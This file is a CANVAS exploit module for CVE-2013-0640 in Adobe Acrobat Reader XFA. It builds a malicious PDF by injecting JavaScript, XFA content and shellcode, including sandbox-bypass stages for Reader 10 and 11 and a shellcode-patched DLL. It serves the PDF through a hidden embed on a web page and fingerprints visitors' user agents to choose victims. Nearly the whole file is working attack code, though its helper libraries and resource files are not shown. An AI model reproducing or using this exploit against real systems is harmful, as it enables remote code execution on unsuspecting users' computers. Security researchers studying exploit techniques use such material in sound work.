##ImmunityHeader v1 
###############################################################################
## File       :  acrobat_xfa.py
## Description:  
##            :  
## Created_On :  Wed May 29 2013
## Created_By :  Enrique Iurleo/David Arch
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from libs.ua_parser import user_agent_parser
from httpclientside import httpclientside
import dll as payloads

NAME                              = 'Adobe Acrobat Reader XFA (<=10.X)'
DESCRIPTION                       = 'Adobe Acrobat Reader XFA'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Adobe"
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION["CERT Advisory"]    = 'None'
DOCUMENTATION['VersionsAffected'] = '10.X and below'
DOCUMENTATION["CVE Name"]         = "CVE-2013-0640"
DOCUMENTATION["CVE Url"]          = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0640"
DOCUMENTATION['CVSS']             = 9.3

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['7']
PROPERTY['DELIVERY']              = 'HTTP'

NOTES                             = """

Tested on:
Windows 7 Professional SP1 and Windows 7 Ultimate (no Service Pack) with

Reader 11.001 (HTTP/HTTPS payloads do not work due to size constraints)
Reader 10.105
Reader 10.104
Reader 10.103
Reader 10.102
Reader 10.101
Reader 10.100

"""

CHANGELOG                         = """
"""

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *
import shellcode.standalone.windows.payloads as other_payloads

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion = 1
        self.badstring     = ''
        self.name          = NAME 
        self.htmlfilename  = 'file.html'
        self.source_pdf    = 'Resources/blank.pdf'
        self.dest_pdf      = 'temp.pdf'
        self.httpmosdef    = True
        self.tag = 0xcafebeef
        self.searchcode_vprotect = True
        self.searchcode_mod_stack = False
        self.searchcode = None
        self.badstring = ''
        
    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0

        major, minor, _, _ = self.getReaderVersions(info_dict)
        if not major: return 0
        
        # Tested/verified on 10.1.4
        if major <= 11: return 1
        return 0

    def makePDF(self):
        self.createShellcode()
        self.createStage1Shellcode()
        
        self.log("Shellcode size: %d" % len(self.shellcode))
        js = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Resources', 'xploit.js'), 'rb').read()
        # Reader 10 Shellcode
        js = js.replace('FIRST', self.reader10_shellcode[0])
        js = js.replace('LAST',  self.reader10_shellcode[1])
        
        # Reader 11 Search shellcode
        self.createSearchSellcode()        
        js = js.replace('SEARCH', self.searchcode)
        
        # Reader 11 sandbox bypass dll
        self.createDLLShellcode()
        js = js.replace('SHELLCODE', self.dll_shellcode)
        
        input = PdfFileReader(file(self.source_pdf,'rb'))
        xfa = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Resources', 'xfa.xml'), 'rb').read()

        self.setJS(input, js)
        self.setXFA(input, xfa)
        
        page = input.getPage(0)
        output = PdfFileWriter()
        output.addPage(page)
        root = output._root.getObject()
        root = output._root=input.trailer['/Root']
        output.write(file(self.dest_pdf, 'wb'))
        return file(self.dest_pdf, 'rb').read()
        
    def setXFA(self,input, content):
        jsobject = StreamObject()
        jsobject._data = content

        input.trailer['/Root'][NameObject('/AcroForm')] = DictionaryObject()
        jsdict=input.trailer['/Root']['/AcroForm'].getObject()
        jsdict[NameObject('/XFA')] = jsobject.flateEncode()
    
    def setJS(self,input, content):
        #set the js content
        jsobject = StreamObject()
        jsobject._data = content
        
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')] = NameObject('/JavaScript')
        jsdict[NameObject('/JS')] = jsobject.flateEncode()
    
    def createDLLShellcode(self):
        # Create the Reader 11 sandbox bypass dll, we put the shellcode on the 
        # rdata shellcode placeholder
        dll_data = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Resources', 'adobe.dll'), 'rb').read()
        dll_data = dll_data[:0x1260] + self.shellcode + '\x90'*(0x800-len(self.shellcode)) + dll_data[0x1260+0x800:]
        p = other_payloads.payloads()
        sc = p.dll_from_mem(dll_data)
        sc = p.assemble(sc)
        self.dll_shellcode = self.urlencode(sc)
                                  
    def createSearchSellcode(self):
        #This is for searching the load_dll_payload + dll_data on Reader 11
        # We need to start searching on 0x30000000 because the tag appears a 
        # bunch of times before that
        sc = shellcodeGenerator.win32()
        sc.addAttr('SearchCodeSafeSEH', {'tag' : self.tag,
                                         'vprotect' : self.searchcode_vprotect,
                                         'mod_stack' : self.searchcode_mod_stack,
                                         'start' : 0x30000000
                                         }
                   )
        sc.standalone = 1
        self.searchcode = sc.get()
        while len(self.searchcode) % 4 != 0:
            self.searchcode += '\x41'  
            
        self.searchcode = self.urlencode(self.searchcode)
        
    def createStage1Shellcode(self):
        # Reader 10 sandbox bypass
        p = payloads.payloads()
        sc = p.create_shellcode(self.shellcode)        
        sc = p.assemble(sc)
        first = sc[:172]
        last = sc[180:]

        while len(last) % 4 != 0:
            last += '\x41'
            
        self.reader10_shellcode = (self.urlencode(first),self.urlencode(last))
        
    def urlencode(self, buf):
        tmp = ""
        i = 0
        if len(buf) % 2 == 0:
            for c in buf:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            return tmp
        else:
            for c in buf[:-1]:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            tmp += "%%u%2.2x"%(ord(buf[-1]))
            return tmp            
        
    def getArgs(self):
        self.source_pdf = self.argsDict.get('source_filename', self.source_pdf)
        self.dest_pdf   = self.argsDict.get('dest_filename', self.dest_pdf)

    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            b.setBody(self.makePDF())
        else:
            self.log('%s exploit is redirecting this session to root HTML: %s'%(self.name, self.htmlfilename))
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b
    
    def run(self):
        self.getArgs()
        self.host = self.target.interface
        self.filedata = self.makePDF()
        self.log('Opening %s for output'  % (self.dest_pdf))
        fd = file(self.dest_pdf, 'wb')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s' % (self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
